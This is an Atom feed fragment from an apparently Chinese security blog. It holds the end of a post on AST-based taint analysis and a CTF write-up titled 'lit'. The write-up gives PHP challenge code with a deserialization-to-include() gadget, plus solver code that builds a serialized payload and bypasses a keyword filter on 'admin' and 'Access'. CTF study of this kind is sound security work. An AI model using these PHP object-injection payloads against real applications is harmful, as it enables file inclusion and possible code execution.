class="line">    <span class="keyword">print</span>(<span class="string">&quot;Collected taint variables:&quot;</span>, info[<span class="string">&quot;taints&quot;</span>])</span><br><span class="line">    <span class="keyword">for</span> finding in info[<span class="string">&quot;findings&quot;</span>]:</span><br><span class="line">        <span class="keyword">print</span>(finding)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;流程&quot;&gt;&lt;a href=&quot;#流程&quot; class=&quot;headerlink&quot; title=&quot;流程&quot;&gt;&lt;/a&gt;流程&lt;/h1&gt;&lt;p&gt;先写一个简单的寻找危险函数的AST然后打补丁，提取出这个危险函数的参数，通过正则来判断这个参数的师傅是拼接或者直接通过AST来判断，对可以直</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>lit</title>
    <link href="https://lisien11.xyz/2025/08/16/lit/"/>
    <id>https://lisien11.xyz/2025/08/16/lit/</id>
    <published>2025-08-16T12:19:16.000Z</published>
    <updated>2025-08-16T15:35:55.954Z</updated>
    
    <content type="html"><![CDATA[<img src="/2025/08/16/lit/IMG_20250816-201923453.png" class="">  <p>&lt;?php<br>class User<br>{<br>    public $username=0;<br>    public $value;<br>    public function exec()<br>    {<br>        $ser = unserialize(serialize(unserialize($this-&gt;value)));<br>        if ($ser != $this-&gt;value &amp;&amp; $ser instanceof Access) {<br>            include($ser-&gt;getToken());<br>        }<br>    }<br>    public function __destruct()<br>    {<br>        if ($this-&gt;username == “admin”) {<br>            $this-&gt;exec();<br>        }<br>    }<br>}</p><p>class Access<br>{</p><pre><code>protected $prefix=&quot;/&quot;;protected $suffix=&quot;/../flag&quot;;public function getToken()&#123;    if (!is_string($this-&gt;prefix) || !is_string($this-&gt;suffix)) &#123;        throw new Exception(&quot;Go to HELL!&quot;);    &#125;    $result = $this-&gt;prefix . &#39;lilctf&#39; . $this-&gt;suffix;    if (strpos($result, &#39;pearcmd&#39;) !== false) &#123;        throw new Exception(&quot;Can I have peachcmd?&quot;);    &#125;    return $result;&#125;</code></pre><p>}</p><p>$a=new User();<br>$a-&gt;value=serialize(new Access());<br>$b=array(0=&gt;$a,1=&gt;NULL);<br>$ser=urlencode(serialize($b));<br>echo $ser;<br>if (strpos($ser, ‘admin’) !== false &amp;&amp; strpos($ser, ‘Access”:’) !== false) {<br>    exit (“no way!!!!”);<br>}</p><p>$user = unserialize(urldecode($ser));<br>throw new Exception(“nonono!!!”);</p><img src="/2025/08/16/lit/IMG_20250816-222712239.png" class="">  ]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2025/08/16/lit/IMG_20250816-201923453.png&quot; class=&quot;&quot;&gt;  
&lt;p&gt;&amp;lt;?php&lt;br&gt;class User&lt;br&gt;{&lt;br&gt;    public $username=0;&lt;br&gt;    public $v</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>测试备忘录</title>
    <link href="https://lisien11.xyz/2025/07/25/%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://lisien11.xyz/2025/07/25/%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2025-07-25T14:56:34.000Z</published>
    <updated>2025-08-16T15:35:55.956Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
